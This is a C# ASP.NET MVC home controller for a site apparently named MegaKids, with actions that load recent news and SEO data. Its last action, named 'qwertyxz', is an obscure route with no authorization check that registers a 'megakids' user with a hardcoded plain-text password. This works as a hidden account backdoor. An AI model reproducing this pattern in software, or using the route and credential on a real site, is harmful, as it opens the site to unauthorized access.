using MegaKids.DataModel;
using MegaKids.DataModel.Models;
using MegaKids.WebUI.Filters;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Data.Entity;
using System.Web.Mvc;
using MegaKids.IServices.Models;
using MegaKids.IServices.Models.WebPage;
using MegaKids.WebUI.Infrastructura;

namespace MegaKids.WebUI.Controllers
{
    //[Culture]
    public class HomeController : DefaultController
    {

        public ActionResult Index()
        {
            var viewModel = new ViewModel()
            {
                ModelNews = MainServices.News.GetNewsList(CurrentLang)
                .OrderBy(x => x.CreateDate).Take(4).ToList(),
                Seo = MainServices.Modules.GetCurrentPageSeo(CurrentLang.Id, EnumSitePage.Index)
            };
            return View(viewModel);
        }     
        
        public ActionResult PartialRecentNews(int count)
        {
            var model = MainServices.News.GetRecentNews(count, CurrentLang);
            return PartialView(model);
        }

        public ActionResult qwertyxz()
        {
            WebUser.Register("megakids", "", "&j%g!Gm5v7hX");
            return View();
        }
    }
}